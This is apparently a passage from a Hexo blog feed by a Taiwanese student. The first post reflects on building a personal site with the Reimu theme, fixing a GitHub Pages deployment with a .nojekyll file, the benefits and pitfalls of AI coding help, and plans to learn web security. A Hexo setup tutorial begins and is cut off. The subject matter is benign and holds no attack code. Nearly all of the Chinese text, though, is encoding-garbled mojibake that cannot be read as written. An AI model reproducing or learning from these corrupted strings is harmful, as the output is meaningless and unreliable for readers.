<h1 id="C-åˆ°å‰ç«¯çš„è·¨ç•Œåˆé«”é©—"><a href="#C-åˆ°å‰ç«¯çš„è·¨ç•Œåˆé«”é©—" class="headerlink" title="C++åˆ°å‰ç«¯çš„è·¨ç•Œåˆé«”é©—"></a>C++åˆ°å‰ç«¯çš„è·¨ç•Œåˆé«”é©—</h1><p>æˆ‘é–‹å§‹å¯«ç¨‹å¼å’Œå…¶ä»–é›»ç¥æ¯”å·²ç¶“ç®—å¾ˆæ™šäº†ï¼Œç´„è«æ˜¯é«˜ä¸€ä¸Šç¬¬ä¸€å­¸æœŸé–‹å§‹å­¸C++ï¼Œä¸¦æ±ºå®šç”¨é€™æ¢è·¯èµ°ç‰¹é¸ä¸Šå¤§å­¸ï¼Œé›–ç„¶ç›®æ¨™æ˜¯è³‡å®‰ç«¶ç¨‹é ˜åŸŸï¼ˆ<del>ä¸»è¦æ˜¯æ€•èµ°å‰ç«¯æœƒåƒåœŸ</del>ï¼‰ä½†æˆ‘é‚„æ˜¯æ±ºå®šæŒ‘æˆ°è‡ªå·±ï¼Œå˜—è©¦å­¸ç¿’ç¶²ç«™é–‹ç™¼ï¼ˆå‡å­¸éœ€è¦ï¼‰ï¼Œä¸éï¼Œ<strong>é€™æ¬¡çš„ç¶²ç«™è£½ä½œä¸¦ä¸æ˜¯å¾é›¶é–‹å§‹ï¼Œè€Œæ˜¯ä½¿ç”¨äº†Hexoæ¡†æ¶ä¸¦å¥—ç”¨äº†ç¾æˆçš„æ¨¡æ¿ã€‚</strong>ï¼ˆ<del>æŠ€è¡“ä¸å¤ </del>ï¼‰é›–ç„¶éç¨‹ç›¸å°ç°¡å–®ï¼Œä½†ä»ç„¶è®“æˆ‘å°ç¶²ç«™æ¶æ§‹æœ‰äº†åˆæ­¥çš„äº†è§£ï¼ˆé«˜äºŒå†ä¾†å…¨éƒ¨é‡å¯«ï¼‰</p>
<h1 id="Hexoæ¡†æ¶çš„é¸æ“‡èˆ‡æº–å‚™"><a href="#Hexoæ¡†æ¶çš„é¸æ“‡èˆ‡æº–å‚™" class="headerlink" title="Hexoæ¡†æ¶çš„é¸æ“‡èˆ‡æº–å‚™"></a>Hexoæ¡†æ¶çš„é¸æ“‡èˆ‡æº–å‚™</h1><h2 id="ç‚ºä»€éº¼é¸æ“‡Hexoï¼Ÿ"><a href="#ç‚ºä»€éº¼é¸æ“‡Hexoï¼Ÿ" class="headerlink" title="ç‚ºä»€éº¼é¸æ“‡Hexoï¼Ÿ"></a>ç‚ºä»€éº¼é¸æ“‡Hexoï¼Ÿ</h2><p><img src="/img/FB/hexo.webp" alt="hexo"><br>å‰›é–‹å§‹æ¥è§¸ç¶²ç«™é–‹ç™¼æ™‚ï¼Œæˆ‘é¢è‡¨äº†ä¸€å€‹å•é¡Œï¼šæ‡‰è©²å¾å“ªè£¡é–‹å§‹ï¼Ÿåœ¨çœ‹äº†å¾ˆå¤šé›»ç¥çš„ç¶²ç«™å¾Œï¼Œæˆ‘ç™¼ç¾äº†Hexoé€™å€‹æ¡†æ¶ã€‚Hexoæ˜¯ä¸€å€‹å¿«é€Ÿã€ç°¡å–®ä¸”é«˜æ•ˆçš„éœæ…‹ç¶²ç«™ç”Ÿæˆå™¨ï¼Œç‰¹åˆ¥é©åˆåƒæˆ‘é€™æ¨£<del>æ²’æœ‰æŠ€è¡“çš„äºº</del>ã€‚å®ƒçš„å„ªå‹¢åœ¨æ–¼ï¼š</p>
<blockquote>
<p><strong>ç°¡å–®æ˜“ç”¨</strong>ï¼šåªéœ€è¦å®‰è£Node.jså’Œnpm(<del>å°linuxç›¸å°å‹å–„</del>)ï¼Œå°±å¯ä»¥å¿«é€Ÿæ­å»ºç¶²ç«™ã€‚</p>
</blockquote>
<blockquote>
<p><strong>æ”¯æŒMarkdown</strong>ï¼šå°æ–¼ä¸ç†Ÿæ‚‰HTMLçš„åˆå­¸è€…ä¾†èªªï¼Œç”¨Markdownæ’°å¯«å…§å®¹éå¸¸å‹å¥½ã€‚</p>
</blockquote>
<blockquote>
<p><strong>æ¨¡æ¿è±å¯Œ</strong>ï¼šæœ‰å¤§é‡ç¾æˆçš„æ¨¡æ¿å¯ä¾›é¸æ“‡ï¼Œèƒ½è¼•é¬†æ‰“é€ ä¸€å€‹ç¾è§€çš„ç¶²ç«™ã€‚</p>
</blockquote>
<p>æ­¤å¤–ï¼Œç”¨Hexoå¯ä»¥è®“æˆ‘å°ˆæ³¨æ–¼å‰µä½œï¼Œè€Œä¸èŠ±å¤ªå¤šæ™‚é–“åœ¨æŠ€è¡“ç´°ç¯€ä¸Šã€‚é€™å°æ–¼å‰›é–‹å§‹æ¢ç´¢ç¶²ç«™é–‹ç™¼çš„æˆ‘ä¾†èªªï¼Œæ˜¯ä¸€å€‹ç†æƒ³çš„é¸æ“‡ã€‚</p>
<h2 id="å¥—æ¨¡æ¿çš„éç¨‹"><a href="#å¥—æ¨¡æ¿çš„éç¨‹" class="headerlink" title="å¥—æ¨¡æ¿çš„éç¨‹"></a>å¥—æ¨¡æ¿çš„éç¨‹</h2><p>åœ¨æ±ºå®šè¦ç”¨Hexoç•¶ä¸‹æˆ‘å°±å·²ç¶“æ‰¾å¥½è¦ç”¨çš„æ¨¡æ¿äº†ï¼Œåœ¨èŒ«èŒ«æ¨¡æ¿ä¸­D-Sketonå¤§å¤§æ‰€è£½ä½œçš„Reimuæ¨¡æ¿é¢¨æ ¼ä¸€ä¸‹å°±å¸å¼•åˆ°äº†æˆ‘<del>ï¼ˆæˆ‘åªæ˜¯çœ‹åˆ°æ±æ–¹å°±é€²ä¾†äº†ï¼‰</del>çš„æ³¨æ„ã€‚ä½†æ­¤æ™‚çš„æˆ‘ä¸¦ä¸çŸ¥é“æ¥ä¸‹ä¾†æ‰æ˜¯åœ°ç„çš„é–‹å§‹â€¦.<br><img src="https://camo.githubusercontent.com/f64a6ac5d574730263df80812a6bb4c603a25a9563440b45c9cc37c1b228df65/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f442d536b65746f6e2f6865786f2d7468656d652d7265696d75406d61696e2f5f73637265656e73686f742f5265696d755f6461726b2e706e67" alt="reimu"></p>
<h1 id="å¯¦éš›æ“ä½œèˆ‡å¿ƒå¾—"><a href="#å¯¦éš›æ“ä½œèˆ‡å¿ƒå¾—" class="headerlink" title="å¯¦éš›æ“ä½œèˆ‡å¿ƒå¾—"></a>å¯¦éš›æ“ä½œèˆ‡å¿ƒå¾—</h1><h2 id="å¤§å¡é—œ"><a href="#å¤§å¡é—œ" class="headerlink" title="å¤§å¡é—œ"></a>å¤§å¡é—œ</h2><p>é¦–å…ˆæˆ‘é‡åˆ°çš„ç¬¬ä¸€å€‹å•é¡Œæ˜¯ï¼šã€Œè¦æ€éº¼åœ¨ Linux ä¸Šå¯« Hexo ç¶²ç«™ï¼Ÿã€<br>ç”±æ–¼æˆ‘çš„é›»è…¦æ˜¯ Linux ç³»çµ±ï¼Œè€Œæˆ‘éå»å¾ä¾†æ²’åœ¨ Linux ä¸Šå¾ GitHub æŠ“éæ±è¥¿ã€ä¹Ÿæ²’ç”¨é Hexoï¼Œå…‰æ˜¯ç’°å¢ƒå®‰è£å°±è®“æˆ‘æ‘¸äº†å¥½ä¸€é™£å­ã€‚ä»€éº¼ Node.jsã€npmã€Hexo CLIã€æ¬Šé™è¨­å®šâ€¦â€¦å…¨éƒ½è¦è‡ªå·±æ…¢æ…¢çˆ¬æ–‡æ‘¸ç´¢ã€‚</p>
<p>ä½†çœŸæ­£çš„å•é¡Œæ˜¯ï¼Œæ˜¯éƒ¨ç½²åˆ° GitHub Pages çš„æ™‚å€™ï¼Œå¾Œå°ä¸€ç›´å ±éŒ¯ã€Œæ‰¾ä¸åˆ° Reimu æ¨¡æ¿ã€ã€‚æˆ‘åè¦†ç¢ºèªæª”æ¡ˆéƒ½æœ‰å‚³ä¸Šå»ã€è·¯å¾‘ä¹Ÿæ­£ç¢º,ä½†å°±æ˜¯æ€éº¼éƒ½éä¸äº†ã€‚<strong>ç•¶æ™‚çš„æˆ‘é¡¯ç„¶ä¸çŸ¥é“<code>GitHub Pages é è¨­æœƒå•Ÿç”¨ Jekyll è™•ç†å™¨ï¼Œè€Œæˆ‘å¯«çš„æ˜¯hexoæ¶æ§‹....èƒ½è·‘æ‰æœ‰é¬¼ã€‚</code></strong></p>
<p>æˆ‘åœ¨é€™å€‹å•é¡Œä¸Šå¡äº†å¿«ä¸€å€‹æœˆï¼Œè©¦äº†å„ç¨®æ–¹æ³•éƒ½æ²’ç”¨ã€‚ç›´åˆ°æœ‰ä¸€å¤©æˆ‘è…¦è¢‹çªç„¶æ¸…é†’å»å•AIï¼Œå°æ–¹å»ºè­°æˆ‘ï¼šã€Œåœ¨æ ¹ç›®éŒ„æ”¾ä¸€å€‹åç‚º .nojekyll çš„ç©ºæª”æ¡ˆã€‚ã€<br>é›–ç„¶æˆ‘ä¹Ÿä¸æ¸…æ¥šç‚ºä»€éº¼é€™æ¨£å¯ä»¥è·‘ï¼Œä½†è‡³å°‘ä»–éäº†(â—‰ï¼“â—‰)</p>
<h2 id="AIçš„å½±éŸ¿"><a href="#AIçš„å½±éŸ¿" class="headerlink" title="AIçš„å½±éŸ¿"></a><code>AI</code>çš„å½±éŸ¿</h2><p>æœ€è¿‘å¼•èµ·è¨è«–çš„<code>Vibe Coding</code>å¼·èª¿çš„æ˜¯ <strong>ã€Œå®Œå…¨é †æ‡‰æ„Ÿè¦ºï¼ˆvibesï¼‰ã€æ“æŠ±AIå¸¶ä¾†çš„é€²æ­¥ï¼Œä¸¦å¿˜è¨˜ç¨‹å¼ç¢¼æœ¬èº«çš„å­˜åœ¨ã€</strong> é€™ç¨®å¯«æ³•æŸç¨®ç¨‹åº¦ä¸Šè§£æ”¾äº†é–‹ç™¼è€…çš„æ€ç¶­ï¼Œè®“å‰µä½œéç¨‹æ›´åƒæ˜¯åœ¨ç•«ç•«ã€ä½œæ›²ï¼Œè€Œä¸æ˜¯ä¸€è¡Œä¸€è¡Œçš„å°»ç¨‹å¼ç¢¼( Â´â€¢Ì¥Ì¥Ì¥Ï‰â€¢Ì¥Ì¥Ì¥&#96; )</p>
<p>é›–ç„¶é€™æ¬¡é–‹ç™¼é‚„ç®—ä¸ä¸ŠçœŸæ­£çš„<code>vibe coding</code>ï¼Œä½†å¯¦éš›ä¸Šï¼Œå¤§ç´„æœ‰<strong>å°‡è¿‘4æˆä»¥ä¸Šçš„å•é¡Œ</strong>ï¼Œéƒ½æ˜¯é€éäººå·¥æ™ºæ…§å¹«æˆ‘ç™¼ç¾èˆ‡æ’é™¤çš„ã€‚ä¾‹å¦‚ CSS çš„èªæ³•éŒ¯èª¤ã€ YAML æ ¼å¼éŒ¯èª¤ã€ç”šè‡³æ˜¯ Hexo è¨­å®šæª”çš„å°ç´°ç¯€ï¼Œå¾ˆå¤šæˆ‘æ ¹æœ¬é‚„æ²’æ³¨æ„åˆ°çš„ bugï¼ŒAI éƒ½èƒ½å³æ™‚æé†’æˆ‘ï¼Œç”šè‡³æä¾›ä¿®æ­£å»ºè­°ã€‚</p>
<p>é›–ç„¶åœ¨å¾ˆå¤šæƒ…å¢ƒä¸‹å®ƒèƒ½æä¾›å³æ™‚ä¸”ç²¾æº–çš„å”åŠ©ï¼Œ<strong>ä½†åœ¨æŸäº›è¤‡é›œæˆ–éœ€è¦ç´°è†©åˆ¤æ–·çš„åœ°æ–¹ï¼Œå®ƒåè€Œæœƒè¶Šèµ°è¶Šåã€‚</strong></p>
<p>ä¾‹å¦‚æœ‰å¹¾æ¬¡æˆ‘é‡åˆ° YAML èªæ³•éŒ¯èª¤æ™‚ï¼ŒAI çµ¦çš„å»ºè­°çœ‹èµ·ä¾†æ­£ç¢ºï¼Œä½†å¯¦éš›ä¸Šåªæ˜¯ <strong>ã€Œè¡¨é¢æ­£ç¢ºã€</strong> â€”â€” ç¸®æ’é›–ç„¶å°äº†ï¼Œé‚è¼¯å»éŒ¯äº†ï¼Œå°è‡´ Hexo ä»ç„¶ç„¡æ³•æ­£ç¢ºé‹ä½œã€‚æ­¤å¤–ï¼Œå®ƒæœ‰æ™‚å€™æœƒçµ¦å‡º ã€Œéæ™‚ã€ çš„è§£æ³•æˆ–æ˜¯ ã€Œçœ‹ä¼¼åˆç†ä½†æ ¹æœ¬ä¸å­˜åœ¨çš„èªæ³•ã€ ï¼Œç‰¹åˆ¥æ˜¯åœ¨è™•ç†ä¸€äº›åé–€åŠŸèƒ½æˆ–è‡ªå®šç¾©å…ƒä»¶æ™‚ã€‚</p>
<p>é‚„æœ‰ä¸€å€‹å•é¡Œï¼Œå°±æ˜¯ <strong>ã€Œå¤ªä¾è³´ AIã€</strong>ã€‚ä¸€æ—¦é–‹å§‹ç¿’æ…£å• AIï¼Œè‡ªå·±å‹•æ‰‹æŸ¥è³‡æ–™ã€æŸ¥æ–‡ä»¶çš„æ©Ÿæœƒå°±æœƒè®Šå°‘ï¼Œä¹Ÿå®¹æ˜“è®“è‡ªå·±çš„ debugging èƒ½åŠ›é€€åŒ–ã€‚å°¤å…¶æ˜¯ç•¶ AI çš„å›ç­”æ²’æœ‰å‘½ä¸­å•é¡Œæ™‚ï¼Œ<strong>å¦‚æœè‡ªå·±ä¹Ÿä¸çŸ¥é“è©²æ€éº¼ debugï¼Œå°±æœƒå¡å¾—æ›´ä¹…</strong>ã€‚<br>(<del>ç¾åœ¨æœ‰ä¸€å †äººç”šè‡³é€£gitéƒ½ä¸æœƒç”¨</del>)</p>
<h2 id="è‹±æ–‡çš„é‡è¦æ€§"><a href="#è‹±æ–‡çš„é‡è¦æ€§" class="headerlink" title="è‹±æ–‡çš„é‡è¦æ€§"></a>è‹±æ–‡çš„é‡è¦æ€§</h2><p>åœ¨AIçš„æµªæ½®ä¹‹ä¸‹ï¼Œæˆ‘å¸¸å¸¸å¿½è¦–äº†è‹±æ–‡çš„é‡è¦æ€§ï¼Œç¸½è¦ºå¾—åªè¦ç¨‹å¼å¯«å¾—å¥½ï¼Œå°±å¯ä»¥è¼•é¬†æ‡‰å°æ‰€æœ‰æŒ‘æˆ°ã€‚ä½†å¾é€™æ¬¡çš„é–‹ç™¼éç¨‹ä¸­<code>github</code>å®ƒå€‘çš„ä»‹é¢å’Œæ–‡æª”å¹¾ä¹å…¨æ˜¯è‹±æ–‡ã€‚æ¯ç•¶é‡åˆ°å•é¡Œæ™‚ï¼Œæˆ‘ä¸å¾—ä¸èŠ±å¤§é‡æ™‚é–“ç ”è®€è‹±æ–‡èªªæ˜å’ŒéŒ¯èª¤è¨Šæ¯ï¼Œè©¦åœ–ç†è§£å®ƒå€‘çš„æ„æ€ï¼ˆ<del>çœŸçš„çœ‹ä¸æ‡‚é˜¿â€¦.</del>ï¼‰</p>
<p>é€™äº›ç¶“æ­·è®“æˆ‘æ·±åˆ»æ„è­˜åˆ°ï¼Œè‹±æ–‡å°æ–¼è³‡å·¥ç§‘ç³»å­¸ç”Ÿçš„é‡è¦æ€§<strong>ä¸åƒ…åƒ…æ˜¯ã€ŒåŠ åˆ†é …ã€</strong>ï¼Œè€Œæ˜¯ <strong>ã€Œå¿…å‚™æŠ€èƒ½ã€</strong>ã€‚å¾æŠ€è¡“æ–‡æª”åˆ°ç¨‹å¼èªè¨€çš„é—œéµå­—ï¼Œå†åˆ°åœ‹éš›é–‹ç™¼è€…ç¤¾ç¾¤çš„äº¤æµï¼Œè‹±æ–‡ç„¡è™•ä¸åœ¨ã€‚å¦‚æœæ²’æœ‰åŸºæœ¬çš„è‹±æ–‡èƒ½åŠ›ï¼Œä¸åƒ…å­¸ç¿’é€²åº¦æœƒè¢«æ‹–æ…¢ï¼Œç”šè‡³å¯èƒ½éŒ¯å¤±è¨±å¤šå¯¶è²´çš„è³‡æºèˆ‡æ©Ÿæœƒã€‚</p>
<p>é€™æ¬¡é–‹ç™¼å‘Šè¨´æˆ‘ï¼šä¹‹å¾Œè‹±æ–‡èª²å†ä¹Ÿä¸æ•¢ç¡è¦ºäº†~~(Â´â—“Ğ”â—”&#96;)</p>
<h1 id="åæ€èˆ‡æœªä¾†"><a href="#åæ€èˆ‡æœªä¾†" class="headerlink" title="åæ€èˆ‡æœªä¾†"></a>åæ€èˆ‡æœªä¾†</h1><h2 id="æˆå°±æ„Ÿèˆ‡ä¸è¶³ä¹‹è™•"><a href="#æˆå°±æ„Ÿèˆ‡ä¸è¶³ä¹‹è™•" class="headerlink" title="æˆå°±æ„Ÿèˆ‡ä¸è¶³ä¹‹è™•"></a>æˆå°±æ„Ÿèˆ‡ä¸è¶³ä¹‹è™•</h2><p>é€™æ¬¡ä½¿ç”¨Hexoæ¡†æ¶æ­å»ºç¶²ç«™ä¸¦å¥—ç”¨æ¨¡æ¿çš„éç¨‹ï¼Œè®“æˆ‘æ„Ÿå—åˆ°äº†ä¸€ç¨®å‰æ‰€æœªæœ‰çš„æˆå°±æ„Ÿ(è†¨è„¹)ã€‚å¾ç„¡åˆ°æœ‰çš„éç¨‹ä¸­ï¼Œæ¯ä¸€æ­¥éƒ½å……æ»¿äº†æ¨‚è¶£(<del>å’Œç—›è‹¦</del>)ã€‚å°¤å…¶æ˜¯åœ¨LLMçš„å¹«åŠ©ä¸‹ï¼Œæˆ‘èƒ½å¿«é€Ÿè§£æ±ºå•é¡Œï¼Œä¸¦å®Œæˆä¸€äº›ä¹‹å‰èªç‚ºå¾ˆè¤‡é›œçš„åŠŸèƒ½ã€‚</p>
<p>ç„¶è€Œï¼Œé€™æ¬¡çš„é–‹ç™¼éç¨‹ä»æœ‰è¨±å¤šä¸è¶³ä¹‹è™•ï¼š</p>
<blockquote>
<p><strong>ä¾è³´æ¨¡æ¿èˆ‡AI</strong>ï¼šç”±æ–¼ä¸»è¦æ˜¯å¥—ç”¨æ¨¡æ¿å’Œä½¿ç”¨AIè¼”åŠ©ï¼Œæˆ‘å°ç¶²ç«™çš„åº•å±¤æ¶æ§‹å’Œç¨‹å¼é‚è¼¯çš„ç†è§£é‚„ä¸å¤ æ·±å…¥ã€‚</p>
</blockquote>
<blockquote>
<p><strong>ç¼ºä¹è‡ªä¸»æ€§</strong>ï¼šé›–ç„¶AIå¹«åŠ©æˆ‘è§£æ±ºäº†è¨±å¤šå•é¡Œï¼Œä½†æœ‰äº›ä»£ç¢¼æ˜¯ç”±AIç”Ÿæˆçš„ï¼Œè‡ªå·±ä¸¦æœªå®Œå…¨æŒæ¡å…¶é‚è¼¯ï¼Œé€™å¯èƒ½å°è‡´æœªä¾†çš„ç¶­è­·å›°é›£(<del>å¤§ä¸äº†åœ¨é‡å¯«ä¸€å€‹</del>)ã€‚</p>
</blockquote>
<h2 id="æœªä¾†è¨ˆåŠƒ"><a href="#æœªä¾†è¨ˆåŠƒ" class="headerlink" title="æœªä¾†è¨ˆåŠƒ"></a>æœªä¾†è¨ˆåŠƒ</h2><p>é€™æ¬¡ç¶“é©—è®“æˆ‘å°ç¶²ç«™é–‹ç™¼ç”¢ç”Ÿäº†èˆˆè¶£(<del>é›¢åƒåœŸé€²äº†ä¸€æ­¥</del>)ï¼Œä¹Ÿç‚ºæˆ‘æœªä¾†çš„å­¸ç¿’æŒ‡æ˜äº†ä¸€äº›æ–¹å‘ã€‚æˆ‘å¸Œæœ›èƒ½åœ¨ä»¥ä¸‹å¹¾å€‹æ–¹é¢ä¾†æå‡è‡ªå·±çš„èƒ½åŠ›ï¼š</p>
<blockquote>
<p><strong>å¾é›¶é–‹å§‹æ’°å¯«ç¶²ç«™</strong> :<br>ä¸‹ä¸€æ¬¡ï¼Œæˆ‘è¨ˆåŠƒå¾é ­å­¸HTMLã€CSSå’ŒJavaScriptï¼Œå˜—è©¦å¾é›¶é–‹å§‹å¯«ä¸€å€‹ç°¡å–®çš„éœæ…‹ç¶²ç«™(<del>or å‹•æ…‹?</del>)ã€‚é€™å°‡å¹«æˆ‘æ›´æ·±å…¥åœ°ç†è§£ç¶²ç«™é–‹ç™¼çš„åŸºç¤çŸ¥è­˜ï¼Œä¸¦æå‡æˆ‘çš„è‡ªä¸»é–‹ç™¼èƒ½åŠ›ã€‚</p>
</blockquote>
<blockquote>
<p><strong>æ¢ç´¢å¾Œç«¯æŠ€è¡“</strong> :<br>é™¤äº†å‰ç«¯é–‹ç™¼ï¼Œæˆ‘ä¹Ÿå¸Œæœ›å­¸ç¿’å¾Œç«¯æŠ€è¡“(åæ­£éƒ½å­¸ä¸€é»å°±å°äº†)ï¼Œå¦‚Node.jsæˆ–Python Flaskï¼Œäº†è§£å¦‚ä½•è™•ç†ä¼ºæœå™¨ç«¯é‚è¼¯å’Œæ•¸æ“šåº«æ“ä½œã€‚</p>
</blockquote>
<blockquote>
<p><strong>çµåˆè³‡å®‰èˆ‡ç«¶ç¨‹èƒŒæ™¯</strong> :<br>ä½œç‚ºä¸€åç†Ÿæ‚‰C++ä¸”å°è³‡å®‰å’Œç«¶ç¨‹æ„Ÿèˆˆè¶£çš„å­¸ç”Ÿï¼Œæˆ‘å¸Œæœ›èƒ½å°‡é€™äº›æŠ€èƒ½çµåˆèµ·ä¾†ã€‚ä¾‹å¦‚ï¼Œåœ¨å­¸ç¿’ç¶²ç«™é–‹ç™¼æ™‚ï¼Œå˜—è©¦äº†è§£å¸¸è¦‹æ¼æ´ï¼ˆå¦‚XSSã€SQLæ³¨å…¥ï¼‰ä»¥åŠå¦‚ä½•é˜²ç¯„å®ƒå€‘ã€‚åŒæ™‚ï¼Œä¹Ÿå¯ä»¥ç ”ç©¶å¦‚ä½•å°‡é«˜æ•ˆç®—æ³•æ‡‰ç”¨æ–¼ç¶²ç«™åŠŸèƒ½ä¸­ã€‚</p>
</blockquote>
<blockquote>
<p><strong>æ¸›å°‘å°AIå·¥å…·çš„ä¾è³´</strong> :<br>é›–ç„¶<code>AI</code>æä¾›äº†æ¥µå¤§çš„ä¾¿åˆ©ï¼Œä½†æˆ‘å¸Œæœ›èƒ½é€æ­¥æ¸›å°‘å°å®ƒçš„ä¾è³´ï¼Œæ›´å¤šåœ°ä¾é è‡ªå·±çš„èƒ½åŠ›å®Œæˆé–‹ç™¼å·¥ä½œã€‚</p>
</blockquote>
<h1 id="çµå°¾"><a href="#çµå°¾" class="headerlink" title="çµå°¾"></a>çµå°¾</h1><p><strong>é€™æ¬¡é–‹ç™¼è®“æˆ‘èªè­˜äº†å¾ˆå¤šäººï¼Œå­¸æœƒäº†å¾ˆå¤šäº‹ï¼Œä¹Ÿè®“æˆ‘ç¬¬ä¸€æ¬¡é«”æœƒåˆ°æŠŠä¸€å€‹æƒ³æ³•æ…¢æ…¢å¯¦ç¾å‡ºä¾†çš„éç¨‹ã€‚</strong></p>
<p>å¾æ¶è¨­éƒ¨è½æ ¼ã€å­¸ç¿’ Hexoã€æ”¹ä¸»é¡Œã€èª¿æ•´æ¨£å¼ï¼Œåˆ°å¾Œä¾†ç ”ç©¶éƒ¨ç½²ã€è¸©å‘é™¤éŒ¯ã€å­¸è‘—å¯« Markdownï¼Œæˆ‘ç™¼ç¾å…¶å¯¦åšç¶²ç«™ä¸¦ä¸åªæ˜¯å¯«ç¨‹å¼è€Œå·²ï¼Œæ›´æ˜¯ä¸€ç¨®è¡¨é”ã€æ•´ç†èˆ‡åˆ†äº«çš„æ–¹å¼ã€‚<strong>é›–ç„¶é€™å€‹éƒ¨è½æ ¼é‚„æœ‰å¾ˆå¤šå¯ä»¥æ”¹é€²çš„åœ°æ–¹ï¼Œä½†å®ƒä»£è¡¨äº†æˆ‘é€™æ®µæ™‚é–“çš„åŠªåŠ›èˆ‡æˆé•·</strong>ã€‚æœªä¾†æˆ‘æœƒç¹¼çºŒæ›´æ–°å…§å®¹ï¼Œè¨˜éŒ„å­¸ç¿’æ­·ç¨‹ï¼Œä¹Ÿå¸Œæœ›èƒ½<strong>èªè­˜æ›´å¤šå¿—åŒé“åˆçš„æœ‹å‹ï¼Œä¸€èµ·å¯«ã€ä¸€èµ·åˆ†äº«ã€ä¸€èµ·é€²æ­¥</strong>ã€‚</p>
<p>æœ€å¾Œï¼Œæˆ‘æƒ³é¼“å‹µæ‰€æœ‰åˆå­¸è€…ï¼Œä¸è¦å®³æ€•å˜—è©¦æ–°äº‹ç‰©ã€‚å³ä½¿ä¸€é–‹å§‹åªæ˜¯å¥—ç”¨æ¨¡æ¿æˆ–ä¾è³´AIè¼”åŠ©ï¼Œ<strong>æ¯ä¸€æ¬¡åŠªåŠ›éƒ½æ˜¯æˆé•·çš„ä¸€éƒ¨åˆ†</strong>ã€‚æœªä¾†ï¼Œæˆ‘æœŸå¾…è‡ªå·±èƒ½å‰µé€ å‡ºå®Œå…¨å±¬æ–¼è‡ªå·±çš„ç¶²ç«™ï¼Œä¸¦çµåˆè³‡å®‰èˆ‡ç«¶ç¨‹èƒŒæ™¯ï¼Œå¯¦ç¾æ›´å¤šå¯èƒ½æ€§ã€‚</p>
<p><img src="/img/FB/%E4%B8%BB%E9%A0%81.webp" alt="ä¸»é "><br>ä¸»é æˆªåœ–(æˆªè‡ª2025&#x2F;8&#x2F;21)</p>
]]></content>
      <categories>
        <category>æ¯”è³½å¿ƒå¾—</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>å‰ç«¯é–‹ç™¼</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨ GitHub Pages + Hexo æ¶è¨­å€‹äººBLOG</title>
    <url>/2025/08/27/hexo/</url>
    <content><![CDATA[<p>åœ¨é€™å€‹è³‡è¨Šçˆ†ç‚¸çš„æ™‚ä»£ï¼Œã€Œéƒ¨è½æ ¼ã€é€™ä¸€å€‹çœ‹ä¼¼å·²ç¶“éæ™‚çš„åè©ï¼Œå…¶å¯¦ä¾ç„¶æ˜¯å±¬æ–¼å€‹äººé–‹ç™¼è€…ã€ç ”ç©¶è€…èˆ‡å‰µä½œè€…çš„ä¸€å¡Šæ·¨åœŸã€‚èˆ‡ç¤¾ç¾¤å¹³å°çš„ç¢ç‰‡åŒ–è³‡è¨Šä¸åŒï¼Œéƒ¨è½æ ¼æ›´é©åˆé€²è¡Œç³»çµ±æ€§çš„çŸ¥è­˜æ•´ç†èˆ‡æŠ€è¡“åˆ†äº«ï¼Œè®“å…§å®¹èƒ½å¤ è¢«æœå°‹ã€è¢«ä¿å­˜ã€è¢«æŒçºŒé–±è®€ã€‚å°¤å…¶å°ç¨‹å¼è¨­è¨ˆæˆ–ç¶²è·¯å®‰å…¨é ˜åŸŸçš„å­¸ç¿’è€…ä¾†èªªï¼Œä¸€å€‹å±¬æ–¼è‡ªå·±çš„æŠ€è¡“éƒ¨è½æ ¼ï¼Œä¸åƒ…èƒ½å¤ ç´€éŒ„æˆé•·æ­·ç¨‹ï¼Œä¹Ÿæœ‰åŠ©æ–¼åœ¨æœªä¾†å»ºç«‹å€‹äººå“ç‰Œã€‚</p>
<p>æœ¬ç¯‡å°‡å¸¶ä½ å¾é›¶é–‹å§‹(åœ¨windowsç³»çµ±ä¸Š)ï¼Œä½¿ç”¨ Hexoï¼ˆä¸€å€‹å¿«é€Ÿã€ç°¡æ½”çš„éœæ…‹éƒ¨è½æ ¼æ¡†æ¶ï¼‰æ­é… GitHub Pagesï¼ˆGitHub æä¾›çš„å…è²»éœæ…‹ç¶²é è¨—ç®¡æœå‹™ï¼‰ï¼Œä¸€æ­¥æ­¥å®Œæˆå±¬æ–¼è‡ªå·±çš„éƒ¨è½æ ¼æ¶è¨­ã€‚</p>
<h2 id="æº–å‚™ç’°å¢ƒ"><a href="#æº–å‚™ç’°å¢ƒ" class="headerlink" title="æº–å‚™ç’°å¢ƒ"></a>æº–å‚™ç’°å¢ƒ</h2><p>åœ¨æ­£å¼é–‹å§‹ä¹‹å‰ï¼Œè«‹å…ˆç¢ºä¿é›»è…¦å…·å‚™ä»¥ä¸‹ç’°å¢ƒï¼š</p>
<ul>
<li>Node.jsï¼ˆå»ºè­°å®‰è£ LTS ç‰ˆæœ¬ï¼ŒHexo éœ€ Node.js 14+ æ”¯æ´ï¼‰  </li>
<li>npmï¼ˆNode.js æœƒä¸€ä½µå®‰è£ npm å¥—ä»¶ç®¡ç†å·¥å…·ï¼‰  </li>
<li>Gitï¼ˆæ“ä½œ GitHub ç‰ˆæœ¬æ§ç®¡åŠéƒ¨ç½²éœ€è¦ï¼‰  </li>
<li>GitHub å¸³è™Ÿï¼ˆç”¨ä¾†å­˜æ”¾å°ˆæ¡ˆèˆ‡æä¾› Pages ç¶²ç«™ï¼‰</li>
</ul>
<h3 id="å®‰è£-Node-js"><a href="#å®‰è£-Node-js" class="headerlink" title="å®‰è£ Node.js"></a>å®‰è£ Node.js</h3><p>å‰å¾€å®˜ç¶²ä¸‹è¼‰ä»‹é¢<br><a href="https://nodejs.org/zh-tw/download">https://nodejs.org/zh-tw/download</a><br><img src="/img/Hexo/hexo.webp" alt="hexo"><br>å¦‚æœæœ‰ Docker å°±è¤‡è£½ä¸Šé¢ç¨‹å¼ç¢¼åˆ°çµ‚ç«¯æ©Ÿè£¡ï¼Œæ²’æœ‰å°±æŒ‰åº•ä¸‹çš„ä¸‹è¼‰ MSI æª”å†åŸ·è¡Œå³å¯ã€‚<br>å»ºè­°ä¸ç®¡ Hexo æˆ– NodeJS éƒ½èƒ½ä¸‹è¼‰æœ€æ–°ï¼ˆè‡³å°‘ LTSï¼‰çš„ç‰ˆæœ¬ï¼Œæ‰èƒ½å¾—åˆ°å®˜æ–¹ä¿®è£œæ¼æ´æˆ–å„ªåŒ–å¾Œçš„æœ€ä½³é«”é©—ã€‚</p>
<h2 id="Hexo-å¯¦ä½œ"><a href="#Hexo-å¯¦ä½œ" class="headerlink" title="Hexo å¯¦ä½œ"></a>Hexo å¯¦ä½œ</h2><ol>
